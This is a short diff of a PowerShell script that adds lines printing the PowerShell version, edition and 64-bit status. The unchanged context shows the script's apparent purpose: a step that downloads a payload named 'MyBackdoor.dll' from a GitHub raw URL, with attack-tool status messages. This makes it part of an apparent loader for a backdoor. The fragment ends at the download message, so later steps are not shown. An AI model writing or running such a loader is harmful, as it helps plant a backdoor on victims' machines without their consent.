@@ -5,6 +5,11 @@ if ([Environment]::Is64BitProcess) {
     Write-Host "[!] Running in 32-bit PowerShell"
 }
 
+Write-Host "[*] Running under:" `
+           + (Get-Host).Version `
+           + " / " + $PSVersionTable.PSEdition
+Write-Host "[*] Is64BitProcess = $([Environment]::Is64BitProcess)"
+
 # 1) Download the DLL bytes
 $payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
 Write-Host "[*] Downloading payload from $payloadUrl"
